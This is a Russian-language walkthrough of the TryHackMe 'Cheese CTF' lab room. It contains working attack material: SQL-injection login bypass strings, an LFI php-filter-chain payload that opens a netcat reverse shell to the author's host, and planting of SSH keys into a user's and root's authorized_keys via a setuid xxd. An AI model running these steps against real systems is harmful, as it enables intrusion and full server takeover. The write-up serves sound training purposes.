- https://tryhackme.com/room/cheesectfv10

## Разведка
Для начала добавим полученный ip в /etc/hosts/

Запустим nmap, он очень долго работал, поэтому сразу попробуем зайти на 80 порт
```
└─$ nmap -sC 10.67.147.43 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 10:48 +0300
```

На hhtp встречаем сайт про сыр
<img width="1470" height="774" alt="Pasted image 20260117105419" src="https://github.com/user-attachments/assets/37e5f3ea-a287-4cc8-825f-2a906948a0ac" />

Есть поле для логина
<img width="1470" height="774" alt="Pasted image 20260117105615" src="https://github.com/user-attachments/assets/301502c0-c088-49e9-a52e-d4f5e1d40616" />

После nmap прислал результат с огромным количеством открытых портов с непонятными версиями и тп, но там был 22 и 80 порт, больше нам и не надо.

Переберем директории
```
└─$ feroxbuster -u http://cheese.thm/ -x php, txt, html --dont-extract-links
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cheese.thm/
 🚩  In-Scope Url          │ cheese.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, , txt, , html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      121w     1759c http://cheese.thm/
301      GET        9l       28w      309c http://cheese.thm/images => http://cheese.thm/images/
200      GET       28l       53w      834c http://cheese.thm/login.php
200      GET       18l       35w      377c http://cheese.thm/users.html
200      GET       59l      121w     1759c http://cheese.thm/index.html
200      GET       18l       35w      380c http://cheese.thm/orders.html
200      GET       18l       33w      448c http://cheese.thm/messages.html
```

Проходимся во всем директориям:
```
http://cheese.thm/users.html
```
<img width="1470" height="778" alt="Pasted image 20260117105749" src="https://github.com/user-attachments/assets/0b29e3d7-0f4e-49ce-8b31-0082001fd1fc" />

```
http://cheese.thm/messages.html
```
<img width="1470" height="846" alt="Pasted image 20260117105902" src="https://github.com/user-attachments/assets/ceabc43b-1a54-4d2f-9064-967a8fa6e516" />

Это уже интересно, когда нажимаем на гиперссылку нас редиректит сюда:
```
http://cheese.thm/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
```
<img width="1215" height="459" alt="Pasted image 20260117105918" src="https://github.com/user-attachments/assets/f8335ccd-51d1-4ce9-8ff4-b2eaa5a201bb" />

На этом этапе мы имеем следующее: поле логина и возможно LFI.
## Эксплуатация

В целом, можно сразу проверить на наличие LFI и попробовать прочитать /еtc/passwd
>**LFI (Local File Inclusion)** — это уязвимость, при которой приложение позволяет злоумышленнику загружать и читать файлы с локальной файловой системы сервера через подмену параметров пути, например ?page=../../etc/passwd.

<img width="1470" height="351" alt="Pasted image 20260117110554" src="https://github.com/user-attachments/assets/4d495d59-91d8-4687-8f6b-841e3a0c1996" />

У нас есть LFI, Хорошо, посмотрим что еще есть. 
В поле авторизации закинем SQLmap создадим файл req.req - это запрос, который оправляется с кредами, его можно взять из BurpSuite или через браузер

>**SQLmap — это автоматизированный инструмент для обнаружения и эксплуатации SQL-инъекций, который сам тестирует параметры, определяет тип базы данных, обходит фильтры и позволяет извлекать данные или получать доступ к системе.**

```
─$ sqlmap -r req.req  
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:02:22 /2026-01-17/

[11:02:22] [INFO] parsing HTTP request from 'req.req'
[11:02:22] [INFO] testing connection to the target URL
[11:02:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:02:23] [INFO] testing if the target URL content is stable
[11:02:23] [INFO] target URL content is stable
[11:02:23] [INFO] testing if POST parameter 'username' is dynamic
[11:02:23] [WARNING] POST parameter 'username' does not appear to be dynamic
[11:02:23] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:02:24] [INFO] testing for SQL injection on POST parameter 'username'
[11:02:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:02:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:02:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:02:26] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:02:26] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:02:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:02:30] [INFO] testing 'Generic inline queries'
[11:02:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:02:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:02:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[11:02:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:02:43] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[11:03:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:03:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://cheese.thm/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] t
[11:03:17] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
zsh: suspended  sqlmap -r req.req
```

Дальше я перебрал класические запросы для SQLi 

```
' OR 1=1 -- -
" OR 1=1 -- -
') OR 1=1 -- -
" OR ""="" -- -
admin' -- -
admin' #
admin'/*
... 
```

И подошел вот такой запрос `' || 1=1;-- -`
<img width="1470" height="847" alt="Pasted image 20260117111224" src="https://github.com/user-attachments/assets/d0cccc18-28e5-4f3a-9fe7-277a412ea011" />

И панель админа все равно выводит нас на LFI в том же самом месте в поле messages, тут можно было и не заниматься SQLi

Мы видим что страница загружает php файл secret-script.php, но там стоит фильтрация, если бы не она, то можно было бы просто прокинуть реверс шелл, но нужно как-то обойти через кодировку
Поищем что можно сделать с этим LFI
https://github.com/synacktiv/php_filter_chain_generator - этот скрипт позволяет нам обойти фильтрацию

Открываем у себя порт
```
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
```

Наш скрипт создает команду и мы записываем ее в pl.txt
```
└─$ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.129.222 4444 >/tmp/f"); ?>' | grep '^php' > pl.txt
```

Делаем такой запрос с серверу
```
└─$ curl -s "http://cheese.thm/secret-script.php?file=$(cat pl.txt)" 
```

и получаем наш реверс шелл в другом терминале.
```
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [192.168.129.222] from (UNKNOWN) [10.67.147.43] 35762
sh: 0: can't access tty; job control turned off
$ ls
adminpanel.css
images
index.html
login.css
login.php
messages.html
orders.html
secret-script.php
style.css
supersecretadminpanel.html
supersecretmessageforadmin
users.html
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-67-147-43:/var/www/html$ 
```

## USER
Следующий этап, мы внутри и теперь надо повысить себе права, сначала до юзера, потом до рута. Пошурша по системе, в /home, я нашел пользователя /comte и у него были неправильно настроены права для записи, это позволяло нам переписывать файлы в его директории, что мы и сейчас и будем использовать во благо:

Создадим на своей машине ssh ключ comte_key
```
└─$ ssh-keygen -f comte_key            
Generating public/private ed25519 key pair.
Enter passphrase for "comte_key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in comte_key
Your public key has been saved in comte_key.pub
The key fingerprint is:
SHA256:4mgDX2ybFzbqAjeP+hIZnbzUuY7ublezTI9l9oPoXmI obsca@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|   o o .         |
|  . =.o          |
|  .+ .=.S        |
|  +o+=.*+o+      |
|   +=*=+EX.o     |
|  ..=o+o=oo o    |
|  .O=o.oo    .   |
+----[SHA256]-----+
                                                                                                                                   
└─$ cat comte_key.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwT7034bJ3/MPjaLzOCUOU6V5UsyPu5wa/XVwdXcUer obsca@kali
```

И положим наш ключ в ключи пользователя comte
```
www-data@ip-10-67-147-43:/home$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwT7034bJ3/MPjaLzOCUOU6V5UsyPu5wa/XVwdXcUer obsca@kali" > comte/.ssh/authorized_keys                         
</XVwdXcUer obsca@kali" > comte/.ssh/authorized_keys
```

Смело заходим по ssh, как к себе домой
```
└─$ ssh comte@cheese.thm -i comte_key 
```

И читаем наш флаг
```
comte@ip-10-67-147-43:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{REDACTED}
```

## ROOT
Смотрим что умеем
```
comte@ip-10-67-147-43:~$ sudo -l
User comte may run the following commands on ip-10-67-147-43:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

Есть некий файл, посмотрим что он содержит
```
comte@ip-10-67-147-43:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

Перейдем в директорию к файлу и посмотрим что есть рядом с ним
```
comte@ip-10-67-147-43:/etc/systemd/system$ ls -la
total 136
drwxr-xr-x 21 root root 4096 Jan 17 07:44 .
drwxr-xr-x  5 root root 4096 Apr 26  2025 ..
-rw-r--r--  1 root root  472 Mar 27  2025 badr.service
drwxr-xr-x  2 root root 4096 May 11  2025 cloud-config.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 cloud-final.service.wants
drwxr-xr-x  2 root root 4096 May 11  2025 cloud-init.target.wants
lrwxrwxrwx  1 root root   40 Mar 14  2023 dbus-org.freedesktop.ModemManager1.service -> /lib/systemd/system/ModemManager.service
lrwxrwxrwx  1 root root   44 Mar 14  2023 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
lrwxrwxrwx  1 root root   36 Sep 27  2023 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
lrwxrwxrwx  1 root root   45 Mar 14  2023 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 default.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 emergency.target.wants
-rw-r--r--  1 root root  141 Mar 29  2024 exploit.service
-rwxrwxrwx  1 root root   87 Mar 29  2024 exploit.timer
drwxr-xr-x  2 root root 4096 Mar 14  2023 final.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 getty.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 graphical.target.wants
lrwxrwxrwx  1 root root   38 Mar 14  2023 iscsi.service -> /lib/systemd/system/open-iscsi.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 mdmonitor.service.wants
lrwxrwxrwx  1 root root   38 Mar 14  2023 multipath-tools.service -> /lib/systemd/system/multipathd.service
drwxr-xr-x  2 root root 4096 Jan 17 07:44 multi-user.target.wants
lrwxrwxrwx  1 root root   35 Sep 27  2023 mysqld.service -> /lib/systemd/system/mariadb.service
lrwxrwxrwx  1 root root   35 Sep 27  2023 mysql.service -> /lib/systemd/system/mariadb.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 network-online.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 open-vm-tools.service.requires
drwxr-xr-x  2 root root 4096 Mar 14  2023 paths.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 rescue.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 sleep.target.wants
-rw-r--r--  1 root root  349 Mar 14  2024 snap-core20-2182.mount
-rw-r--r--  1 root root  326 Apr 26  2025 snap-core20-2501.mount
drwxr-xr-x  2 root root 4096 Apr 26  2025 snapd.mounts.target.wants
-rw-r--r--  1 root root  343 Mar 14  2023 snap-lxd-24061.mount
-rw-r--r--  1 root root  320 Apr 26  2025 snap-lxd-32662.mount
-rw-r--r--  1 root root  467 Apr 26  2025 snap.lxd.activate.service
-rw-r--r--  1 root root  541 Apr 26  2025 snap.lxd.daemon.service
-rw-r--r--  1 root root  330 Apr 26  2025 snap.lxd.daemon.unix.socket
-rw-r--r--  1 root root  349 Sep 27  2023 snap-snapd-20092.mount
-rw-r--r--  1 root root  326 Apr 26  2025 snap-snapd-21184.mount
drwxr-xr-x  2 root root 4096 Apr 26  2025 sockets.target.wants
lrwxrwxrwx  1 root root   31 Sep 27  2023 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 sysinit.target.wants
lrwxrwxrwx  1 root root   35 Mar 14  2023 syslog.service -> /lib/systemd/system/rsyslog.service
drwxr-xr-x  2 root root 4096 Mar 29  2024 timers.target.wants
-rw-r--r--  1 root root  156 Sep 27  2023 twist.service
lrwxrwxrwx  1 root root   41 Mar 14  2023 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
```

смотрим exploit.service 
```
comte@ip-10-67-147-43:/etc/systemd/system$ cat exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"

```
Простыми словами бинарник xxd (обычно /usr/bin/xxd) копируется в /opt/xxd с root правами и мы можем его использовать для записи, просмотра и т.д. для файлов с рут правами

```
comte@ip-10-67-147-43:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
comte@ip-10-67-147-43:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
comte@ip-10-67-147-43:/etc/systemd/system$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
```
Но с со скриптом небольшая проблема: там не указано время какое-то, я написал 2s

```
comte@ip-10-67-147-43:/etc/systemd/system$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=2s

[Install]
WantedBy=timers.target
```

И скрипт заработал, он создал бинарник xxd в /opt

```
comte@ip-10-67-147-43:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
comte@ip-10-67-147-43:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
comte@ip-10-67-147-43:/etc/systemd/system$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; enabled; vendor preset: enabled)
     Active: active (elapsed) since Sat 2026-01-17 08:37:21 UTC; 6s ago
    Trigger: n/a
   Triggers: ● exploit.service
comte@ip-10-67-147-43:/etc/systemd/system$ cd /opt
comte@ip-10-67-147-43:/opt$ ls
xxd
```
Смотрим что можем с xxd
- https://gtfobins.github.io/gtfobins/xxd/
Можно используя /opt/xxd просто прочитать /root/root.txt, но это скучно, поэтому давайте получим root сессию!

Создадим такую переменную
```
comte@ip-10-67-147-43:/etc/systemd/system$ LFILE=/root/.ssh/authorized_keys
```

И используя /opt/xxd с флагом -r перезапишем наш ключ root, так же, как это сделали с пользователем comte
```
comte@ip-10-67-147-43:/opt$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwT7034bJ3/MPjaLzOCUOU6V5UsyPu5wa/XVwdXcUer obsca@kali' | /opt/xxd | /opt/xxd -r - "$LFILE"
```

И снова входим как к себе домой но уже как root!
```
└─$ ssh root@cheese.thm -i comte_key  
```

Читаем наш флаг:
```
root@ip-10-67-147-43:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-67-147-43:~# cat /root/root.txt
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{REDACTED}
```

## Почему удалось взломать?
1. LFI
2. Нарушение контроля доступа к файлу
3. SQLi - Даже не смотря на то, что панель администратора не понадобилась для доступа к файлу messege.html, это все равно может быть критично
4. Неправильная конфигурация прав пользователя
